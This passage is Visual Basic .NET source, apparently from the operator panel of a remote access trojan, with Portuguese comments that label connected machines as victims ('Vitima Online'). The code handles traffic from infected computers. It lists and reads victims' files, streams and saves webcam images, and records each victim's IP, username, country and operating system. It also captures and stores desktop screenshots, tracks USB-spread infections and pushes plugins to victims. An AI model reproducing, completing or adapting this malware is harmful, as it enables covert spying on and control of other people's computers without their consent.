                                Dim info2 As New DirectoryInfo(MdFN.DEB(strArray(3)))
                                If (fm.TextBox1.Text = info2.FullName) Then
                                    fm.pr.Value = 0
                                    Dim strArray6 As String() = Strings.Split(strArray(4), ";", -1, CompareMethod.Binary)
                                    fm.pr.Maximum = (strArray6.Length - 1)
                                    fm.L2.Items.Clear()
                                    If (Not info2.Parent Is Nothing) Then
                                        Dim item6 As ListViewItem = fm.L2.Items.Add("..", "..", 0)
                                        item6.ToolTipText = info2.Parent.FullName
                                        item6.SubItems.Add("")
                                        item6.SubItems.Add("Diretório")
                                        item6 = Nothing
                                    End If
                                    fm.MG2.Images.Clear()
                                    fm.MG2.Images.Add(fm.MG.Images.Item(0))
                                    fm.MG2.Images.Add("*", fm.MG.Images.Item(4))
                                    Dim num25 As Integer = (strArray6.Length - 2)
                                    Dim n As Integer = 0
                                    Do While (n <= num25)
                                        If (fm.TextBox1.Text <> info2.FullName) Then
                                            Return
                                        End If
                                        Dim item7 As ListViewItem = fm.L2.Items.Add((info2.FullName & MdFN.DEB(strArray6(n))), MdFN.DEB(strArray6(n)), 0)
                                        item7.SubItems.Add("")
                                        item7.SubItems.Add("Diretório")
                                        item7.ToolTipText = (info2.FullName & item7.Text)
                                        mcach.folders.Add(item7.ToolTipText)
                                        item7 = Nothing
                                        pr = fm.pr
                                        pr.Value += 1
                                        n += 1
                                    Loop
                                    '  fm.TextBox1.BackColor = Color.Gainsboro
                                    fm.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                    client.Send(("@" & MdSokserver.Y & strArray(3)))
                                    fm.pr.Value = 0
                                End If
                            End SyncLock
                            Exit Select




                        Case "#"
                            Dim bar4 As ToolStripProgressBar = fm.pr
                            SyncLock bar4
                                Dim mcach2 As MdFMcach = DirectCast(fm.Cache.Item(MdFN.DEB(strArray(3))), MdFMcach)
                                Dim str3 As String = MdFN.DEB(strArray(3))
                                If (fm.TextBox1.Text = str3) Then
                                    fm.pr.Value = 0
                                    Dim strArray7 As String() = Strings.Split(strArray(4), ";", -1, CompareMethod.Binary)
                                    fm.pr.Maximum = (strArray7.Length - 1)
                                    Dim num26 As Integer = (strArray7.Length - 2)
                                    Dim num14 As Integer = 0
                                    Do While (num14 <= num26)
                                        Dim strArray8 As String() = Strings.Split(MdFN.DEB(strArray7(num14)), ";", -1, CompareMethod.Binary)
                                        If (fm.TextBox1.Text <> str3) Then
                                            Return
                                        End If
                                        Dim item8 As ListViewItem = fm.L2.Items.Add((str3 & strArray8(0)), strArray8(0), 1)
                                        Dim info3 As New FileInfo((str3 & strArray8(0)))
                                        item8.ToolTipText = info3.FullName
                                        item8.SubItems.Add(MdFN.Siz(Conversions.ToLong(strArray8(1))))
                                        If (info3.Extension = "") Then
                                            item8.SubItems.Add("")
                                        Else
                                            item8.SubItems.Add(info3.Extension.Replace(".", ""))
                                            If Not fm.MG2.Images.ContainsKey(info3.Extension) Then
                                                File.Create((Application.StartupPath & "\!" & info3.Extension)).Close()
                                                fm.MG2.Images.Add(info3.Extension, Icon.ExtractAssociatedIcon((Application.StartupPath & "\!" & info3.Extension)))
                                                File.Delete((Application.StartupPath & "\!" & info3.Extension))
                                                item8.ImageKey = info3.Extension
                                            Else
                                                item8.ImageKey = info3.Extension
                                            End If
                                        End If
                                        mcach2.files.Add(String.Concat(New String() {item8.ToolTipText, ";", item8.SubItems.Item(1).Text, ";", item8.SubItems.Item(2).Text}))
                                        item8 = Nothing
                                        pr = fm.pr
                                        pr.Value += 1
                                        num14 += 1
                                    Loop
                                    '  fm.TextBox1.BackColor = Color.WhiteSmoke
                                    fm.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                    fm.pr.Value = 0
                                End If
                            End SyncLock
                            Exit Select





                        Case "$"
                            If MdSokserver.F.InvokeRequired Then
                                MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Else
                                If fm.Images.Contains(MdFN.DEB(strArray(3))) Then
                                    fm.Images.Remove(MdFN.DEB(strArray(3)))
                                End If
                                fm.Images.Add(Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(4)))), MdFN.DEB(strArray(3)), Nothing, Nothing)
                                If (fm.L2.Items.ContainsKey(MdFN.DEB(strArray(3))) AndAlso fm.L2.Items.Item(MdFN.DEB(strArray(3))).Selected) Then
                                    fm.P.Image = DirectCast(fm.Images.Item(MdFN.DEB(strArray(3))), Image)
                                    fm.P.Visible = True
                                End If
                            End If
                            Exit Select



                        Case "%"
                            If MdSokserver.F.InvokeRequired Then
                                MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Else
                                Dim note As New FrmBlocoDeNotas
                                note.FNN = MdFN.DEB(strArray(3))
                                note.Text = (fm.QQ & " - " & note.FNN)
                                note.SK = fm.sk
                                note.TextBox1.Text = MdFN.DEB(strArray(4)).Replace(ChrW(0), "")
                                note.Show()
                                note.SaveToolStripMenuItem.Enabled = False
                            End If
                            Exit Select



                        Case "dl"
                            Dim enumerator As IEnumerator = Nothing
                            Dim strArray9 As String() = Strings.Split(MdFN.DEB(strArray(3)), ";", -1, CompareMethod.Binary)
                            Try
                                enumerator = fm.L2.Items.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                                    If (strArray9(1) = "*") Then
                                        If Not ((current.Text = New DirectoryInfo(strArray9(0)).Name) And (current.SubItems.Item(2).Text = "Diretório")) Then
                                            Continue Do
                                        End If
                                        current.Remove()
                                        Return
                                    End If
                                    If ((current.Text = New DirectoryInfo(strArray9(0)).Name) And (current.SubItems.Item(2).Text <> "Diretório")) Then
                                        current.Remove()
                                        Return
                                    End If
                                Loop
                            Finally
                                If TypeOf enumerator Is IDisposable Then
                                    TryCast(enumerator, IDisposable).Dispose()
                                End If
                            End Try
                            Exit Select




                        Case "nm"
                            Dim enumerator As IEnumerator = Nothing
                            Dim strArray10 As String() = Strings.Split(MdFN.DEB(strArray(3)), ";", -1, CompareMethod.Binary)
                            Try
                                enumerator = fm.L2.Items.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim item4 As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                                    If (item4.ToolTipText = strArray10(0)) Then
                                        If (strArray10(2) = "*") Then
                                            Dim info4 As New DirectoryInfo(strArray10(0))
                                            item4.Text = strArray10(1)
                                            item4.ToolTipText = (info4.Parent.FullName & "\" & item4.Text)
                                        Else
                                            Dim info5 As New FileInfo(strArray10(0))
                                            item4.Text = strArray10(1)
                                            item4.ToolTipText = (info5.Directory.FullName & Conversions.ToString(CDbl((Conversions.ToDouble("\") * Conversions.ToDouble(item4.Text)))))
                                            item4.SubItems.Item(2).Text = New FileInfo(item4.ToolTipText).Extension.Replace(".", "")
                                        End If
                                    End If
                                Loop
                            Finally
                                If TypeOf enumerator Is IDisposable Then
                                    TryCast(enumerator, IDisposable).Dispose()
                                End If
                            End Try
                            Exit Select
                        Case "ER"
                            fm.SL.Text = ("Error " & strArray(4))
                            Exit Select
                    End Select
                    '=======================================================================================================================================================================================================================================














                    'WEBCAM============================================================================================================================================================================================
                ElseIf (str4 = "CAM") Then
                    If (client.L Is Nothing) Then
                        client.L = New ListViewItem
                    End If
                    Dim cam As FrmWebCam = DirectCast(MdSokserver.Gform(("cam" & client.ip)), FrmWebCam)
                    Select Case strArray(2)
                        Case "~"
                            If (cam Is Nothing) Then
                                If MdSokserver.F.InvokeRequired Then
                                    MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                                Else
                                    cam = New FrmWebCam
                                    cam.sk = client
                                    cam.osk = MdSokserver.W.GetClient(strArray(1))
                                    cam.Name = ("cam" & client.ip)
                                    Dim num27 As Integer = (strArray.Length - 1)
                                    Dim num15 As Integer = 3
                                    Do While (num15 <= num27)
                                        cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(strArray(num15))
                                        num15 += 1
                                    Loop
                                    cam.Show()
                                End If
                            Else
                                Dim num28 As Integer = (strArray.Length - 1)
                                Dim num16 As Integer = 3
                                Do While (num16 <= num28)
                                    cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(strArray(num16))
                                    num16 += 1
                                Loop
                            End If
                            Exit Select
                        Case "!"
                            If (strArray(3) <> "!") Then
                                Dim image2 As Image = Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(3))))
                                If cam.CheckBox3.Checked Then
                                    Try
                                        image2.Save((cam.folder & My.Computer.Clock.LocalTime.ToString.Replace("/", "").Replace(":", "-") & Conversions.ToString(CInt(Math.Round(CDbl((CDbl(My.Computer.Clock.LocalTime.Millisecond) / 100))))) & ".jpg"))
                                    Catch exception24 As Exception
                                        ProjectData.SetProjectError(exception24)
                                        Dim exception8 As Exception = exception24
                                        ProjectData.ClearProjectError()
                                    End Try
                                End If
                                cam.PictureBox1.Image = image2
                                cam.Text = (cam.QQ & " Size: " & MdFN.Siz(CLng(strArray(3).Length)))
                            End If
                            If (cam.Button1.Text = "Stop") Then
                                NewLateBinding.LateCall(client, Nothing, "Send", New Object() {Operators.ConcatenateObject((("!" & MdSokserver.Y) & Conversions.ToString(cam.ComboBox1.SelectedIndex) & MdSokserver.Y), cam.ComboBox2.SelectedItem)}, Nothing, Nothing, Nothing, True)
                            Else
                                client.Send("@")
                            End If
                            Exit Select
                    End Select
                    '====================================================================================================================================================================================================================





















                    'NOVA VITIMA==========================================================================================================================================================================
                ElseIf (str4 = "lv") Then

                    Application.DoEvents()



                    ' MsgBox(strArray(0) & vbNewLine & strArray(1) & vbNewLine & strArray(2) & vbNewLine & strArray(3) & vbNewLine & strArray(4) & vbNewLine & strArray(5) & vbNewLine & strArray(6) & vbNewLine & strArray(7) & vbNewLine & strArray(8) & vbNewLine & strArray(9) & vbNewLine & strArray(10))

                    'NOTIFICAÇÃO===========================================================================================================================================================
                    If My.Settings.MostrarNotificação = True Then

                        If MdSokserver.F.InvokeRequired Then
                            MdSokserver.F.Invoke(New _Req(AddressOf MdSokserver.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                        ElseIf (DirectCast(MdSokserver.Gform(("YyUNAS" & client.ip)), Frm_Notificação) Is Nothing) Then
                            Try
                                Dim N As New PopupNotifier
                                N.TitleText = "Vitima Online (+1) " & TimeOfDay.ToString("hh:mm") & " " & Date.Today.ToString("dd/MM/yyyy")
                                N.ContentText = "ID : " & MdFN.DEB(strArray(1)) & vbNewLine & _
                                "IP : " & Strings.Split(client.ip, ":", -1, CompareMethod.Binary)(0) & vbNewLine & _
                                "Usuário : " & strArray(2) & "/" & strArray(3) & vbNewLine & _
                                "País : " & strArray(5) & vbNewLine & _
                                "Sistema : " & strArray(6) & vbNewLine
                                N.ShowCloseButton = My.Settings.MyMostrarBotaodeFechar
                                N.ShowOptionsButton = My.Settings.MyMostrarMenudeOpcoes
                                N.ShowGrip = My.Settings.MyMostrarGrip
                                N.Scroll = My.Settings.MyEfeito
                                N.Delay = Integer.Parse(My.Settings.MyDuracao) 'A
                                N.AnimationInterval = Integer.Parse(My.Settings.MyIntervalodeAnimacao) 'A
                                N.AnimationDuration = Integer.Parse(My.Settings.MyDuracaodaAnimacao) 'A
                                N.TitlePadding = New Padding(Integer.Parse(My.Settings.MyTituloPadding)) 'A
                                N.ContentPadding = New Padding(Integer.Parse(My.Settings.MyDescricaoPadding)) 'A
                                N.ImagePadding = New Padding(Integer.Parse(My.Settings.MyIconePadding)) 'A
                                N.OptionsMenu = MdSokserver.F.CMNotificação
                                N.BodyColor = My.Settings.MyBodyColor
                                N.BorderColor = My.Settings.MyBorderColor
                                N.ButtonBorderColor = My.Settings.MyButtonBorderColor
                                N.ButtonHoverColor = My.Settings.MyButtonHoverColor
                                N.ContentColor = My.Settings.MyContentColor
                                N.ContentHoverColor = My.Settings.MyContentHoverColor
                                N.HeaderColor = My.Settings.MyHeaderColor
                                N.TitleColor = My.Settings.MyTitleColor
                                If My.Settings.MyMostrarIcone = True Then
                                    If MdSokserver.F.IMG2.Images.ContainsKey((strArray(5) & ".png")) Then
                                        N.Image = MdSokserver.F.IMG2.Images((strArray(5) & ".png"))
                                    Else
                                        N.Image = MdSokserver.F.IMG2.Images("X.png")
                                    End If
                                Else
                                    N.Image = Nothing
                                End If
                                N.Popup()
                            Catch ex As Exception

                            End Try
                        End If
                    End If
                    '=========================================================================================================================================================================================




















                    Dim items As ListViewItemCollection = F.L1.Items
                    Monitor.Enter(items)
                    Try
                        If (Not client.L Is Nothing) Then
                            client.L.Remove()
                        End If

                        client.Folder = (Application.StartupPath & "\Coringa_Users\")
                        MdSokserver.F.L1.SuspendLayout()
                        client.L = MdSokserver.F.L1.Items.Add(client.ip, MdFN.DEB(strArray(1)), 0) 'ID

                        'TROCA COR==============
                        Try
                            client.L.ForeColor = Color.FromName(strArray(11))
                        Catch ex As Exception

                        End Try
                        '==============================


                        'GRUPO===============================================================
                        Try
                            If MdSokserver.F.L1.Groups(strArray(12)) Is Nothing Then
                                Dim GA As New ListViewGroup
                                GA.Header = strArray(13)
                                GA.HeaderAlignment = HorizontalAlignment.Left
                                GA.Name = strArray(12)
                                MdSokserver.F.L1.Groups.Add(GA)
                            End If
                            client.L.Group = MdSokserver.F.L1.Groups(strArray(12))
                        Catch ex As Exception

                        End Try
                        '=========================================================================================





                        client.L.ToolTipText = client.ip
                        client.L.Tag = client
                        client.L.SubItems.Add(Strings.Split(client.ip, ":", -1, CompareMethod.Binary)(0)) 'IP
                        Dim num30 As Integer = (strArray.Length - 2)

                        Dim num18 As Integer = 2


                        Do While (num18 <= num30)
                            Dim num31 As Integer = num18
                            If (num31 = MdSokserver.hac) Then
                                client.L.SubItems.Add(MdFN.DEB(strArray(num18)))
                            ElseIf (num31 = MdSokserver.hco) Then
                                If (MdSokserver.F.L1.SmallImageList Is MdSokserver.F.IMG2) Then
                                    If Not MdSokserver.F.IMG2.Images.ContainsKey((strArray(num18) & ".png")) Then
                                        client.L.ImageKey = "X.png"
                                    Else
                                        client.L.ImageKey = (strArray(num18) & ".png")
                                    End If
                                Else
                                    client.L.ImageKey = "s"
                                End If
                                client.L.SubItems.Add(strArray(num18))
                            Else
                                client.L.SubItems.Add(strArray(num18))
                            End If
                            num18 += 1
                        Loop



                        Dim client2 As MdClient = client
                        client2.Folder = String.Concat(New String() {client2.Folder, client.L.SubItems.Item(MdSokserver.hpc).Text, "_", client.L.SubItems.Item(MdSokserver.huser).Text, "_", Strings.Split(client.L.Text, "_", -1, CompareMethod.Binary)((Strings.Split(client.L.Text, "_", -1, CompareMethod.Binary).Length - 1)), "\"})
                        MdSokserver.F.L1.ResumeLayout()
                        client.plg.AddRange(Strings.Split(strArray((strArray.Length - 1)), ",", -1, CompareMethod.Binary))
                    Catch ex As Exception

                    Finally
                        Monitor.Exit(items)
                    End Try



                    Try

                        client.pc = DirectCast(Image.FromStream(New MemoryStream(File.ReadAllBytes((client.Folder & "Desktop.jpg")))), Bitmap)

                    Catch ex As Exception

                    End Try



                    If (MdSokserver.F.L1.Items.Count < 10) Then
                        MdSokserver.F.L1.FX()
                    End If


                    MdSokserver.Log(("Logged " & client.ip & " " & MdFN.DEB(strArray(1))))

                    If MdSokserver.ensr Then
                        MdSokserver.F.L1.EnsureVisible((MdSokserver.F.L1.Items.Count - 1))
                    End If
                    '===============================================================================================================================================================================================





                    'PING==========================================================================================================================================
                ElseIf (str4 = "P") Then

                    If ((Not client.L Is Nothing) AndAlso (client.L.SubItems.Count > MdSokserver.hping)) Then
                        Dim items2 As ListViewItemCollection = MdSokserver.F.L1.Items
                        SyncLock items2
                            client.L.SubItems.Item(MdSokserver.hping).Text = (strArray(1) & "ms")
                        End SyncLock
                    End If
                    '================================================================================================================================================

                ElseIf (str4 = "bla") Then
                    If client.IsUSB Then
                        client.L.ForeColor = Color.Blue
                    Else
                        client.L.ForeColor = Color.Green
                    End If


                ElseIf (str4 = "~") Then

                    client.Send("~")


                    'ERRO=============================================================================================================================================================
                ElseIf (str4 = "ER") Then

                    MdSokserver.Log(String.Concat(New String() {"Error From [", client.ip, "/", client.L.Text, "] At [", strArray(1), "] MSG [", strArray(2), "]"}))

                    '=======================================================================================================================================================================




                ElseIf (str4 = "!") Then
                    If (Not client Is Nothing) Then
                        Dim iSAd As List(Of MdClient) = MdSokserver.ISAd
                        SyncLock iSAd
                            client.Isend = False
                            If MdSokserver.ISAd.Contains(client) Then
                                MdSokserver.ISAd.Remove(client)
                            End If
                        End SyncLock
                        If (MdSokserver.F.CEL Is client) Then
                            Dim box3 As PictureBox = MdSokserver.F.PicMineDesktop
                            SyncLock box3
                                MdSokserver.F.CEL = Nothing
                                MdSokserver.F.PicMineDesktop.Image = Nothing
                            End SyncLock

                            MdSokserver.F.LVListInfoO.Items.Item(0).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(1).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(2).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(3).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(4).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(5).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(6).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(7).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(8).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(9).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(10).Text = ""

                        End If
                        If client.IsUSB Then
                            Dim list4 As List(Of MdClient) = MdSokserver.usb
                            SyncLock list4
                                MdSokserver.usb.Remove(client)
                            End SyncLock
                        End If
                        If (Not client.pc Is Nothing) Then
                            client.pc.Dispose()
                            client.pc = Nothing
                        End If
                        client.snf = Nothing
                        client.plg.Clear()
                        If (Not client.L Is Nothing) Then
                            Dim items3 As ListViewItemCollection = MdSokserver.F.L1.Items
                            SyncLock items3
                                MdSokserver.F.L1.Items.Remove(client.L)
                            End SyncLock
                        End If
                        Try
                            Dim smallImageList As ImageList = MdSokserver.F.L1.SmallImageList
                            SyncLock smallImageList
                                MdSokserver.F.IMG.Images.RemoveByKey(client.ip)
                            End SyncLock
                        Catch exception29 As Exception
                            ProjectData.SetProjectError(exception29)
                            Dim exception13 As Exception = exception29
                            ProjectData.ClearProjectError()
                        End Try
                    End If


                ElseIf (str4 = "pl") Then
                    Try
                        client.plg.Remove(strArray(1))
                    Catch exception30 As Exception
                        ProjectData.SetProjectError(exception30)
                        Dim exception14 As Exception = exception30
                        ProjectData.ClearProjectError()
                    End Try
                    If (strArray(2).ToString = "0") Then
                        client.plg.Add(strArray(1))
                    Else
                        MdSokserver.SendPlug(client, MdSokserver.GETPLG(Nothing, strArray(1)), Conversions.ToBoolean(strArray(2)))
                    End If



                ElseIf (str4 = "CAP") Then
                    Dim list6 As List(Of MdClient) = MdSokserver.ISAd
                    SyncLock list6
                        client.Isend = False
                        If MdSokserver.ISAd.Contains(client) Then
                            MdSokserver.ISAd.Remove(client)
                        End If
                    End SyncLock
                    Dim buffer7 As Byte() = DirectCast(NewLateBinding.LateIndexGet(MdFN.fx(b, MdSokserver.Y), New Object() {1}, Nothing), Byte())
                    client.pc = DirectCast(Image.FromStream(New MemoryStream(buffer7)).Clone, Bitmap)
                    Try
                        If Not Directory.Exists(client.Folder) Then
                            Directory.CreateDirectory(client.Folder)
                        End If
                        NewLateBinding.LateCall(client.pc.Clone, Nothing, "Save", New Object() {(client.Folder & "Desktop.jpg")}, Nothing, Nothing, Nothing, True)
                    Catch exception31 As Exception
                        ProjectData.SetProjectError(exception31)
                        Dim exception15 As Exception = exception31
                        ProjectData.ClearProjectError()
                    End Try
                    If (MdSokserver.F.CEL Is client) Then
                        Dim box4 As PictureBox = MdSokserver.F.PicMineDesktop
                        SyncLock box4
                            MdSokserver.F.PicMineDesktop.Image = DirectCast(client.pc.Clone, Image)
                        End SyncLock
                    End If
                    Dim list7 As ImageList = MdSokserver.F.L1.SmallImageList
                    SyncLock list7
                        If Not MdSokserver.F.IMG.Images.ContainsKey(client.ip) Then
                            MdSokserver.F.IMG.Images.Add(client.ip, client.pc)
                        Else
                            Dim index As Integer = MdSokserver.F.IMG.Images.IndexOfKey(client.ip)
                            MdSokserver.F.IMG.Images.Add(client.ip, client.pc)
                            MdSokserver.F.IMG.Images.RemoveAt(index)
                        End If
                        If (MdSokserver.F.L1.SmallImageList Is MdSokserver.F.IMG) Then
                            client.L.ImageKey = ""
                            client.L.ImageKey = client.ip
                        End If
                    End SyncLock


                ElseIf (str4 = "act") Then
                    Dim items4 As ListViewItemCollection = MdSokserver.F.L1.Items
                    SyncLock items4
                        If (Not client.L Is Nothing) Then
                            client.L.SubItems.Item(MdSokserver.hac).Text = MdFN.DEB(strArray(1))
                        End If
                    End SyncLock
                End If


            End If


        Catch exception32 As Exception
            ProjectData.SetProjectError(exception32)
            Dim exception16 As Exception = exception32
            If ((strArray(0) = "up") Or (strArray(0) = "dw")) Then
                Try
                    client.Send(("close" & MdSokserver.Y & strArray(1)))
                Catch exception33 As Exception
                    ProjectData.SetProjectError(exception33)
                    Dim exception17 As Exception = exception33
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            Else
                If (strArray(0).ToLower = "cap") Then
                    Dim list8 As List(Of MdClient) = MdSokserver.ISAd
                    SyncLock list8
                        client.Isend = False
                        If MdSokserver.ISAd.Contains(client) Then
                            MdSokserver.ISAd.Remove(client)
                        End If
                    End SyncLock
                End If
                MdSokserver.Log(String.Concat(New String() {"Listner Error At[", strArray(0), "] MSG[", exception16.Message, "]"}))
                ProjectData.ClearProjectError()
            End If
        End Try
    End Sub




End Class


Public Class plg
    Public B As String
    Public Hash As String
    Public Name As String
    ' Methods
    Public Sub New(ByVal fnn As String)
        Dim cM As Boolean = True
        B = Convert.ToBase64String(MdFN.ZIP(File.ReadAllBytes((Application.StartupPath & "\plugin\" & fnn)), cM))
        Name = fnn
        Hash = MdFN.getMD5Hash(B)
    End Sub

End Class
